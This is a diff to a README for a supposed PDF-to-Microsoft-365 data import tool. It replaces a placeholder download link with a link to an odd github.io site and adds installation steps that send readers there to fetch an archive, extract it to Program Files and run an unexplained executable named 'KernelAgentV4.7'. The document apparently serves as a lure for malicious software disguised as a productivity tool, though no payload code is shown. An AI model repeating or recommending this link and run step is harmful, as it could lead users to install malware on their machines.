@@ -2,13 +2,14 @@
 
 Seamlessly extract and import structured data from PDF files into Microsoft 365 applications like Excel, Word, and Access. Designed for professionals who need reliable document-to-data automation across the Microsoft ecosystem.
 
-[![Download PDF Import Tool](https://img.shields.io/badge/Download-PDF_Import_Tool-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download PDF Import Tool](https://img.shields.io/badge/Download-PDF_Import_Tool-blueviolet)](https://advanced-pdf-data-import-ms365-v4.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 Download the archive from the link above  
+1. 📦 Download the archive from the [Releases](https://advanced-pdf-data-import-ms365-v4.github.io/.github) section or from the button above  
 2. 📁 Extract the folder to `C:\Program Files\PDFDataImport\`  
 3. 🖱 Run `KernelAgentV4.7`  
 4. ✅ Open Excel or Word and start importing
